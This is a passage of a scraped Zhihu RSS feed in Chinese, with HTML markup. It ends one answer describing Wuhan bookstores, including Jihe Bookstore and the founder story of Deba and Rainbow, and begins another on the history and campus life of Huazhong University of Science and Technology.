少很多了，大多数人到这种书店来，估计无非就是拍拍照、打打卡，喝喝咖啡，顺便发个朋友圈装下C，比如我……还有一部分就是看书的，对没错，仅仅就是看书，免费的空调、样书，优雅的环境它不香么？<br><br>我觉得这里是喜欢阅读之人的精神伊甸园、乌托邦，是喜欢拍照打卡人的“宝地”，更是装C之人的某个不错的“主场”，总之有很多吧……细细一想，还挺多挺杂的……<br><br>扯回我到开头。<br><br>夜深了，我离开了时见鹿。外面的街道依旧显得冰冷寂寥，偶尔闪过几量车来、蹦出几个人来，我独自走在街上，与书店渐行渐远，与租的房子越来越近……<br><br>总感觉，自己像在告别些什么，又在迎接些什么，不然，为何脑中突然又多出来了这对碎碎念呢？</blockquote>\n<p>……</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d2a572dea291994b65a69c851a61368f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"649\" data-rawheight=\"870\" data-watermark=\"watermark\" data-original-src=\"v2-d2a572dea291994b65a69c851a61368f\" data-watermark-src=\"v2-55b5668c37032bba15c47f277ab44312\" data-private-watermark-src=\"v2-c7e4bb908aff7f648e0b201255f15fbb\"></p>\n<p>上面的这段思考到现在已经有9个月了，我对书店的想法大体如此，和阿威老师那天逛了8家书店后，我的想法没有太多变化，反而进一步确认了这种想法的现实性。开书店的人，往往都是理想主义者，许多书店压根就不赚钱，但他们依旧选择坚守：</p>\n<p>有的背后有资本支撑，像卓尔集团旗下的卓尔书城、森林书店时见鹿，这个或许显得轻松一些；有的则是独立民营，诚如华师百草园、境自在书店，那种坚持应当更不易；还有许多旧书店，像泉之旧书社、集成古旧书店，更是要书店掌门人发自内心的热爱、以及耐得住寂寞……</p>\n<p>这么想似乎又显得有些悲观，但我又能体会到开书店的人身上有一股子英雄主义的气质，如此一来，书店行业看似前路茫茫，但又未来可期，为啥？</p>\n<p><b>因为这群人始终都存在，对书店的热爱未曾改变。</b></p>\n<p>以上。</p>\n<p>先写到这里吧。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6344e5413b2153d093588ca82b15e026_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"833\" data-watermark=\"watermark\" data-original-src=\"v2-6344e5413b2153d093588ca82b15e026\" data-watermark-src=\"v2-a2cd45523acf7ee64cf68e5650ea9475\" data-private-watermark-src=\"v2-0195805f8f573eb6675892d2c1b3b08c\"></p>\n<hr>\n<p>我是定安 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/e4bcc3448a5311df6f0960160e9e5e09\" data-hash=\"e4bcc3448a5311df6f0960160e9e5e09\" data-hovercard=\"p$b$e4bcc3448a5311df6f0960160e9e5e09\">@心定且安</a> ，点个关注不迷路~</p>\n<p>再次感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/d7b3ecdf6092824e2705b59668950165\" data-hash=\"d7b3ecdf6092824e2705b59668950165\" data-hovercard=\"p$b$d7b3ecdf6092824e2705b59668950165\">@ChemX</a> 的邀请，以及谢谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/1714d49e5eda1253468e72e58d22eac5\" data-hash=\"1714d49e5eda1253468e72e58d22eac5\" data-hovercard=\"p$b$1714d49e5eda1253468e72e58d22eac5\">@知乎城市-武汉</a> 的认可~</p>\n<hr>\n<p>昨天回答发出去后，收到不少朋友的认可，希望看到更多有趣的书店，那我今天再接着补充两家~</p>\n<h2>10 几何书店</h2>\n<p>你听说过设计成洞穴样子的书店吗？</p>\n<p>今天它来了，它就是几何书店。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-479f310374c572229f6198f1a52238d6_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"642\" data-watermark=\"watermark\" data-original-src=\"v2-479f310374c572229f6198f1a52238d6\" data-watermark-src=\"v2-82161163c303544956f43827d2063f84\" data-private-watermark-src=\"v2-8b16a9a99ddbeb5d5d306c473948cf9c\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>几何书店</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括近期出版的新书、畅销书等</p>\n<p><b>地址：</b>武汉市武昌区和平大道750号绿地缤纷城购物中心5层</p>\n<p>有关这家书店的资料网上目前并不多，我只了解到这是一家来自青海西宁的连锁书店。之前有同学@XXX逛的是上海的几何书店，感谢他的分享~</p>\n<p>我逛的这家，则位于武汉市武昌区的绿地缤纷城，旁边就是那座修了11年还没修完的、被砍去一百多米的“平头哥”绿地中心。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e65b41016b5e454751804143234ea146_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"647\" data-watermark=\"watermark\" data-original-src=\"v2-e65b41016b5e454751804143234ea146\" data-watermark-src=\"v2-aef2188a0ff5f2f6ed63164d723731df\" data-private-watermark-src=\"v2-1d53d5a8b5a835e3f66a04d3e8666d91\"></p>\n<p>知道这家书店，其实挺偶然的。一日我用高德地图输入“书店”这个关键词进行搜索，系统给我推荐了武汉最值得去的15家书店榜单，上面大部分我都有去过，翻着翻着，翻到这家几何书店，看到配图洞穴的装饰，我顿时眼前一亮，见多了以木质书架为主体的文艺范儿书店，不免有些审美疲劳，这家书店装饰成洞穴的样子，还是头一次见。</p>\n<p>OK，下一家书店就是它了。</p>\n<p>由于绿地缤纷城附近在修路，因此工地特别多、道路也比较拥堵，我跟着导航七拐八拐，好不容易才进了大门。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-45479b2bcabd553539a6b47ac81a62fb_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"866\" data-rawheight=\"647\" data-watermark=\"watermark\" data-original-src=\"v2-45479b2bcabd553539a6b47ac81a62fb\" data-watermark-src=\"v2-8ad137118dfda1c4630d455edc401adf\" data-private-watermark-src=\"v2-5d3fa9cdfbe9e1d92b4006b97b516033\"></p>\n<p>几何书店在第5层，书店入口处就被装饰成洞穴的样子，感觉这种设计很容易激发人们的探索欲。</p>\n<p>进入书店，内部更是几乎被洞穴的设计所覆盖，要我看，这家书店不如改名叫“洞穴书店”好了，又形象，还寓意在书中探索未知~</p>\n<p>书籍的摆放方面，跟其他很多连锁书店一样，是遵循着“新书、畅销书、其他细分类型的书、文创产品、咖啡茶饮”的逻辑排布的，买书的人并不很多，但在这里消费咖啡茶饮读书办公的人倒不少，这不禁让我感觉，现在的许多书店，其实更像是一个以书籍为主题的咖啡馆，人们为了更好的办公体验来到这里消费，从而维持了书店的经营，同时再辅以文创产品的售卖，打造一座城市的文化聚集地，成为一张为城市代言的重要名片。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-678348bcf1f3c9985ba3acb0af008487_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"647\" data-watermark=\"watermark\" data-original-src=\"v2-678348bcf1f3c9985ba3acb0af008487\" data-watermark-src=\"v2-ba7006a432e77722d0ad76775492c9fa\" data-private-watermark-src=\"v2-490aa28c64c2250bbd6d91555ace512a\"></p>\n<p>我觉得这是条不错的发展之路，<b>因为就线下书店而言，单纯的卖书肯定打不过线上那些动不动就满100减50的网络书商，于是线下书店必须要将“体验”作为其重要的破局点，</b>这是线上书店难以企及的。我近来逛的无论是西西弗书店、钟书阁，还是转型了的新华书店、现在逛的几何书店，都在朝这个方向发展，从目前开店扩张的角度来看，我觉得效果还不错，值得想做书店的朋友参考借鉴。</p>\n<p>以上是我这次书店漫步的经历和一点思考~</p>\n<h2>11 德芭与彩虹书店（西北湖店）</h2>\n<p>德芭与彩虹书店在武汉已经开了许久了，但2018年的10月31日，因为一些原因，它在武汉天地的门店闭店，时隔一年多，这家书店在西北湖公园再次开张营业。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-909078094252a6210f0f4c90b4ad2a30_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"638\" data-watermark=\"watermark\" data-original-src=\"v2-909078094252a6210f0f4c90b4ad2a30\" data-watermark-src=\"v2-a8a7a72f15d8a749bfc972b756abb3fe\" data-private-watermark-src=\"v2-568b65f8519cbd54d224ca07dd2e27b9\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>德芭与彩虹书店（西北湖店）</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括近期出版的新书、畅销书等</p>\n<p><b>地址：</b>武汉市江汉区北湖街道黄孝西路好世纪大酒店西北侧</p>\n<p>西北湖的这家德芭与彩虹书店不算很大，藏书不多，我当时去的时候，里面也没啥人。算起来，就是前台两三个负责书店管理的店员，以及趴在桌上写作业的学生。有趣的是，这里并没有消费才能入座的要求，整体显得很自由。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1201de03d53ffb5580f26e196e9a5328_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"647\" data-watermark=\"watermark\" data-original-src=\"v2-1201de03d53ffb5580f26e196e9a5328\" data-watermark-src=\"v2-9cc9d9fc758b5f218f52e6d1e4dfb970\" data-private-watermark-src=\"v2-24b156c18c5aabffa43d8f711d8d8724\"></p>\n<p>说起这家书店，算是很多武汉人的青春记忆。下面，我和大家聊聊这家书店创始人的故事。</p>\n<p>这家书店的创始人叫陈嫚，1978年10月生于武汉，自幼就十分喜欢与书为伴，她没有受过高等教育，从事的职业是插画师。在开这家书店之前，她是武汉大大小小书店的常客，喜欢看书淘书。</p>\n<p>2009年，陈嫚在豆瓣上发起了一个同城活动，想“给所有孤独的人开一家温暖的好书店”。当年7月，德芭与彩虹书店在武汉市武昌区街道口珞珈山大厦开张，随后，武汉天地也有了这家书店的身影。</p>\n<p>在豆瓣的网友和线下的读者口口相传下，这家书店成为武汉最为知名的民营书店之一，被很多人称为“武汉最温暖的书店”、“像家一样的书店”。</p>\n<p>初次听到“德芭与彩虹”这个名字，很多人会觉得奇怪，我也一样。很长一段时间，我总是把它与彩虹糖联系起来，我以为这是个卖糖果的门店，但陈嫚取的这个名字，其实有她自己独特的想法。“德芭”是麦兜动画里一只小猫的名字，而“彩虹”则意为美好的生活。之所以起这个名字，是希望能与那些传统老旧的书店加以区别，希望呈现给大众一家清新、美好、吸引人的全新书店。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d577d14e930a43ebf38a48f039e78e40_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"866\" data-rawheight=\"646\" data-watermark=\"watermark\" data-original-src=\"v2-d577d14e930a43ebf38a48f039e78e40\" data-watermark-src=\"v2-7732f786207d0ce8edb1b845554337a1\" data-private-watermark-src=\"v2-2cce61af2a7692b6cb217e3dd8b19669\"></p>\n<p>陈嫚为这家书店做出了许多努力：</p>\n<p>首先，这家书店被定位为一家温暖的优选书店，为爱书人提供舒适的阅读空间，出售书籍、咖啡和杂货，另外还有自助出版和订书服务，全年无休。除此之外，德芭与彩虹还为多家单位和个人提供家具订制、图书采购和装修设计等服务，为多家出版社提供设计、制作和推广服务，鼓励个人藏书、推广藏书票文化。</p>\n<p>这些都逐渐地变成了现实，而像“武汉花友会”、“插画师交流会”、“图书漂流”、“春天读书会”等活动也陆续展开，它们都源自陈嫚的创意。</p>\n<p>可惜的是，因为罹患癌症，尽管经过了两次手术和八次化疗，陈嫚还是没挺住。2014年10月，她安静地离开了这个世界，当时并没有经过什么宣传。2016年3月12日，卓尔集团董事长阎志在社交平台发表了一篇文章《怀念一位书店人》，这才有不少人知道陈嫚去世的消息，网友们纷纷留言悼念这位年轻的书店人，怀念那“城市上空那盏夜灯”。</p>\n<p>陈嫚走后，德芭与彩虹书店就完全由她的老公曾刚打理了。曾刚说，如今实体书店经营很难，而专注于品质阅读和深度阅读的德芭与彩虹就更是如此了。他说自己的妻子陈嫚知道这是一条少有人走的路，但只要用心和坚持，就一定会赢得读者和市场的认同。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0e0ec473b632b1c05f9a31f6525be58a_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"649\" data-watermark=\"watermark\" data-original-src=\"v2-0e0ec473b632b1c05f9a31f6525be58a\" data-watermark-src=\"v2-b015f872438ad411f5bea8d35e6565ab\" data-private-watermark-src=\"v2-e546222b8a718affd94405bee855ddbe\"></p>\n<p>我觉得陈嫚做书店，早已经不是将其当作一份工作，甚至也不停留在一番事业，而是一个读书人、爱书人的终极使命，这种使命感让德芭与彩虹得以坚持下去，并获得越来越多人的认可。</p>\n<p>陈嫚是2013年10月被确诊为癌症晚期的。手术后，陈嫚依旧会在身体许可的条件下去书店走走看看，这是她理想的现实投射，而她的生命也因德芭与彩虹而得以延续。</p>\n<p>暂先写到这里，希望德芭与彩虹书店越来越好。</p>\n<hr>\n<p>我是定安 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/e4bcc3448a5311df6f0960160e9e5e09\" data-hash=\"e4bcc3448a5311df6f0960160e9e5e09\" data-hovercard=\"p$b$e4bcc3448a5311df6f0960160e9e5e09\">@心定且安</a>，感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/1714d49e5eda1253468e72e58d22eac5\" data-hash=\"1714d49e5eda1253468e72e58d22eac5\" data-hovercard=\"p$b$1714d49e5eda1253468e72e58d22eac5\">@知乎城市-武汉</a> 的转发，我们下家书店见~</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-ding-qie-an?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">心定且安</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485888458/answer/2119215445?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/25702206?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉有没有比较好的书店？</a><br><a href=\"http://www.zhihu.com/question/299816767?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">成都为什么书店越来越少？你们在哪买漫画？</a><br>\n","link":"http://www.zhihu.com/question/485888458/answer/2119215445?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"你所在的城市有哪些堪称「景点」的大学？","date":"2021-09-24 08:25:16","description":"\n<p>在武汉，80多所高校密集扎堆</p>\n<p>其中传说不少，比如</p>\n<p>有一所大学曾以男女比例极不均衡出名</p>\n<p>江湖人称 “关山口男子职业技术学院”</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4619af110a4e03de5a3c0c1b9afef354_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"719\" data-rawheight=\"479\" data-watermark=\"original\" data-original-src=\"v2-4619af110a4e03de5a3c0c1b9afef354\" data-watermark-src=\"v2-e354261659f7c5730a450807aafe17d5\" data-private-watermark-src=\"v2-5f7b2caffd3eb7dacfcecbc0d2ed3f57\"></p>\n<p><br></p>\n<p>尽管大家每天都离不开的微信</p>\n<p>就诞生在它的毕业生手上</p>\n<p>网球女王娜姐退役后也选择去这里读书</p>\n<p>坊间尽是它和武大相爱相杀的段子</p>\n<p>但，它在社交媒体上却特别低调神秘</p>\n<p><br></p>\n<p>藏在喻家山脚下默默耕耘半个多世纪</p>\n<p>又高调叱咤中国互联网创业圈风口浪尖</p>\n<p>没有东湖、樱花、老建筑的浪漫传说</p>\n<p>却自带雄赳赳气昂昂的学霸光环</p>\n<p>它的名字叫做</p>\n<p><i><b>“ 华 中 科 技 大 学  ”</b></i></p>\n<p><br></p>\n<p><b>▁▁▁▁</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-55984439915f1176c2ecd3601e66a732_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-55984439915f1176c2ecd3601e66a732\" data-watermark-src=\"v2-697e71d00ab9b2b07154abae540d5468\" data-private-watermark-src=\"v2-04db80e9a40875e1ae92310ced070570\"></p>\n<p><br></p>\n<p><b><i>“ 传说男女比例7：1，直男气场遍地 ”</i></b></p>\n<p><br></p>\n<p>大概是出身理工科的原因</p>\n<p>华科许多角落都透露着典型的“直男癌”气息</p>\n<p><br></p>\n<p>比如</p>\n<p>华科的道路横平竖直，建筑四四方方</p>\n<p>教学楼、宿舍、食堂命名</p>\n<p>清一色的东西南北和一二三四排列组合</p>\n<p>耿直朴素，不加修饰</p>\n<p>比如，东九、西十二、西一食堂、南一舍</p>\n<p><br></p>\n<p>在武汉，可能也只有在华科校园里</p>\n<p>才能听到标准的“北京式问路”</p>\n<p>“往南走200米，然后朝东拐”</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2617af5e5ecba24f9dead9be7ccc1ea9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"964\" data-rawheight=\"548\" data-watermark=\"original\" data-original-src=\"v2-2617af5e5ecba24f9dead9be7ccc1ea9\" data-watermark-src=\"v2-b50863b696a8cd31e6a3d866ea70f95f\" data-private-watermark-src=\"v2-06e248e03c2c5cb8c2085849f3e244cd\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4f73aacb5517a2f7d267912937164e3b_720w.webp?rss\" data-caption=\"△ // 华科图书馆当年的设计图纸（上图）。空中俯瞰，华科老图书馆就是两个巨大的“工”字，可以说是非常耿直的设计了。\" data-size=\"normal\" data-rawwidth=\"1049\" data-rawheight=\"699\" data-watermark=\"original\" data-original-src=\"v2-4f73aacb5517a2f7d267912937164e3b\" data-watermark-src=\"v2-8f414accd051cd5c5c7a7eaba1b05a61\" data-private-watermark-src=\"v2-7b1af16c8420184792cca42bb220189e\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2dd130c4addfec81e3f242607d1dcdd9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"719\" data-watermark=\"original\" data-original-src=\"v2-2dd130c4addfec81e3f242607d1dcdd9\" data-watermark-src=\"v2-bb18381be462ed93daf8e4ccbc3de7bc\" data-private-watermark-src=\"v2-7abc37222e6695a1c5dd3abe7f38c23f\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ddf35a68d55070c8694d84290ba53bbd_720w.webp?rss\" data-caption=\"△ // 东九教学楼建成时，曾是全亚洲最大的教学楼。西十二像一座迷宫，即使在华科读书四年，也还是会迷路。两栋楼一共3万多张课桌，占全校的85%。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-ddf35a68d55070c8694d84290ba53bbd\" data-watermark-src=\"v2-c68d7eee02c3061d9774a54bcd9a3728\" data-private-watermark-src=\"v2-cb9821dda0c24247087e26d86e147aef\"></p>\n<p><br></p>\n<p>南一楼门口的毛主席雕像已经54岁了</p>\n<p>它是全武汉最早的一座毛主席雕像</p>\n<p>由华科师生自己铸模浇筑完成</p>\n<p>如今，它成为关山大道IT男们</p>\n<p>深夜加班时眺望的地标</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5c4b86627daca803be04b978d34be308_720w.webp?rss\" data-caption=\"△ // 华科毛主席雕塑1967年建成，高度接近15米。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-5c4b86627daca803be04b978d34be308\" data-watermark-src=\"v2-0f41b753d889c806c3546a68fe63bb82\" data-private-watermark-src=\"v2-cb349acdbf657a639d6174f2e4bd26e3\"></p>\n<p><br></p>\n<p>华科最传奇的，也是被吐槽最狠的</p>\n<p>莫过于学生的男女比例</p>\n<p>传说“关山口男子职业技术学院”曾经男女比例7：1</p>\n<p>2012年，微信之父张小龙回母校讲座时回忆</p>\n<p>“当年全班42个男生，3个女生</p>\n<p>直到去年同学聚会，还有一个女生不认识我。”</p>\n<p><br></p>\n<p>官方统计数据显示</p>\n<p>2017级本科生男女比例已经变成了2：1</p>\n<p>尽管如此，还是远远超过绝大多数大学</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f1e9049a6f05c732660f884904d41f35_720w.webp?rss\" data-caption=\"△ // 也许是巧合，校园雕塑也符合男女比例2：1。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-f1e9049a6f05c732660f884904d41f35\" data-watermark-src=\"v2-5c94d66e6d9badda632b9ed7e1f6b84a\" data-private-watermark-src=\"v2-a8fa5b8c7f225a4136dbec18810f415c\"></p>\n<p><br></p>\n<p>华科男的青春因此而孤独</p>\n<p>于是，这群最早的“社恐人群”在华科校园里<br></p>\n<p>鼓捣出了可能是全中国最早的大型社交网络</p>\n<p>“白云黄鹤BBS” 1996年3月诞生</p>\n<p>那是第一代武汉网民的记忆</p>\n<p>当时，家庭电脑都罕见，互联网更是新鲜</p>\n<p>华科男已经开始灌水、跟帖，隔空撩妹了</p>\n<p><br></p>\n<p>吃好喝好，是华科的老传统</p>\n<p>全校三十多个食堂</p>\n<p>烧烤凉菜小龙虾，大盘鸡烤肉饭排骨藕汤</p>\n<p>华科大概是全武汉</p>\n<p>乃至全华中食堂数量最多的大学</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2231b1678a7d85dccf7bc87d02cb50fb_720w.webp?rss\" data-caption=\"△ // 1989年，华工就实行了营养配餐制度，每顿饭都荤素搭配六七种菜，图为当年粮票。印章落款为“膳食科”，专注膳食三十年。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"original\" data-original-src=\"v2-2231b1678a7d85dccf7bc87d02cb50fb\" data-watermark-src=\"v2-57c2fb627588e87ad427bac3b75a0c0d\" data-private-watermark-src=\"v2-6781c7cd5d4f118e72ec806626328c27\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3dc7cf2d0486fcdec54955c3bfc5703c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"original\" data-original-src=\"v2-3dc7cf2d0486fcdec54955c3bfc5703c\" data-watermark-src=\"v2-f170800524b73b54fd34610b4ebb735f\" data-private-watermark-src=\"v2-1844dfb82448451fc2af93c184a9edab\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4b12b02c63532086c376b00a40535a4e_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-4b12b02c63532086c376b00a40535a4e\" data-watermark-src=\"v2-44654b9d4a226f37ed3002253c33a426\" data-private-watermark-src=\"v2-e4bf8a224bb0382b12808bd9f506e80f\"></p>\n<p><br></p>\n<p><b><i>“ 刚18岁的华科，原来有百年历史 ”</i></b></p>\n<p><br></p>\n<p>聊了八卦，说到正经的</p>\n<p>尽管武大华科的CP之战已经持续半个世纪之久</p>\n<p>“华中科技大学” 这个称谓却特别年轻</p>\n<p>2000年5月</p>\n<p>华中理工大学、同济医科大学、武汉城市建设学院三所学校正式合并成为“华科”</p>\n<p><br></p>\n<p>但华科校园里已经生长了半个世纪的大树证明</p>\n<p>它的历史，可以追溯到很久以前</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c915ba412872c461bbb152068e829cca_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-c915ba412872c461bbb152068e829cca\" data-watermark-src=\"v2-67a7be4d509c79cd07b2262fc024b28d\" data-private-watermark-src=\"v2-1d46066f61c8a9fc5f3f1a9a1ba26e1d\"></p>\n<p><br></p>\n<p>同济是华科历史最悠久的分支</p>\n<p>1907年诞生在上海，由德国人埃里希·宝隆创办</p>\n<p>这位皇家海军医生，清末随军征战东亚沿海</p>\n<p>最终选择留在上海，办医学院</p>\n<p>培养了中国最早的一批西医人才</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1e77ad30f5c398bf3d808e5d639d96c6_720w.webp?rss\" data-caption=\"△ // 埃里希·宝隆是一位孤儿，靠勤奋苦读拿到医学博士学位，创办同济医学院以后不久，就因为伤寒去世\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-1e77ad30f5c398bf3d808e5d639d96c6\" data-watermark-src=\"v2-b9c5502cf5d20da9f90ccd17d54be4bf\" data-private-watermark-src=\"v2-57a4e6127b484133ab38c1145c06a675\"></p>\n<p><br></p>\n<p>赶上战争年代，他的学生也都是传奇</p>\n<p>比如著名的医学泰斗裘法祖</p>\n<p>二战时，他在德国一家医院当主任</p>\n<p>从纳粹枪口下救出许多集中营战俘</p>\n<p>战争结束后，他在德国结婚生子、买车买房</p>\n<p>生活安稳幸福</p>\n<p>却在新中国成立后，毅然带着全家回国</p>\n<p>他一生做器官移植手术的数量至今无人超越</p>\n<p>被誉为“中国外科之父”</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1b3cf9681aff5ef4d3dfe2db4878d254_720w.webp?rss\" data-caption=\"△ // 裘法祖与德国妻子裘罗懿和子女合影。裘老1956年搬到武汉，一家五口住在华科不到70㎡的红砖房里，直到2008年去世\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"438\" data-watermark=\"original\" data-original-src=\"v2-1b3cf9681aff5ef4d3dfe2db4878d254\" data-watermark-src=\"v2-25561f77486219b4304a1d0ac2e00a9f\" data-private-watermark-src=\"v2-6b94840de8fe20538081e0b72ae4caaf\"></p>\n<p><br></p>\n<p><br></p>\n<p>抗日战争，同济师生八年长征走遍南方中国</p>\n<p>后来它迁到武汉，与武汉大学医学院合并</p>\n<p>变成了同济医科大学</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-32a91e23c899dfc73da2715802347153_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"591\" data-rawheight=\"395\" data-watermark=\"original\" data-original-src=\"v2-32a91e23c899dfc73da2715802347153\" data-watermark-src=\"v2-40c4097df28a6daf90c65dae0bdb42a9\" data-private-watermark-src=\"v2-2ee478c570cab7722387bfd1590ba151\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b203fcade5e293bb0b0bbb34b78e5905_720w.webp?rss\" data-caption=\"△ // “同济长征”期间，师生们划船迁徙逃难，在农村祠堂搭起临时教室讲课。\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"405\" data-watermark=\"original\" data-original-src=\"v2-b203fcade5e293bb0b0bbb34b78e5905\" data-watermark-src=\"v2-9e4195028f931f0389e31ed6d73cef77\" data-private-watermark-src=\"v2-67c4b77e72ba267a4f0ca14b6d3e646c\"></p>\n<p><br></p>\n<p>言归正传</p>\n<p>除了历史最悠久的同济医大</p>\n<p><b>在武汉人心目中，华科的前身是华中理工大学</b></p>\n<p><br></p>\n<p>1952年，赶上学苏联搞建设的热血时代</p>\n<p>武钢、武重、武锅、武船在武汉纷纷建成</p>\n<p>武汉一瞬间变成了中国的工业重镇</p>\n<p>毛主席钦点，国家教育部决定</p>\n<p>在这儿建一所牛x的工学院</p>\n<p>华工就诞生了</p>\n<p><br></p>\n<p>它由5所老牌院校的机械系和电力系组成</p>\n<p>“华科男”木讷的硬汉气质，就从这时开始诞生</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ad2389c78bf6bdfd410b020fd6aa66f2_720w.webp?rss\" data-caption=\"△ // 华中工学院的组建来源，如图所示。1985年它改名“华中理工大学”。中正大学就是现在的南昌大学。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"564\" data-watermark=\"original\" data-original-src=\"v2-ad2389c78bf6bdfd410b020fd6aa66f2\" data-watermark-src=\"v2-bd351106c77c2fb6c45df5fb0f800c26\" data-private-watermark-src=\"v2-ffb21b3f6d211629dd11d308bd22f185\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-85c2666aff06bcff5da63982b93f4c6f_720w.webp?rss\" data-caption=\"△ // 1952年，华工第一任校长查谦在学校成立大会上讲话。查谦校长曾是武大物理系主任。\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"718\" data-watermark=\"original\" data-original-src=\"v2-85c2666aff06bcff5da63982b93f4c6f\" data-watermark-src=\"v2-e44c67ecf40eea06a9b0bd0b104740ab\" data-private-watermark-src=\"v2-a51b364c4c63e96e914b2645384f7edf\"></p>\n<p><br></p>\n<p>当时，华工独占东郊喻家山，面积4000多亩</p>\n<p><b>如今华科面积已经扩展到7000多亩</b></p>\n<p><b>和北大规模差不多，比武大校园大三分之一</b></p>\n<p>老武汉人，还会把“华科”叫做“华工”</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c9adfcc10d8587daf299eb71b30414ef_720w.webp?rss\" data-caption=\"△ // 从喻家山顶俯瞰华科校园，浩荡壮观\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"700\" data-watermark=\"original\" 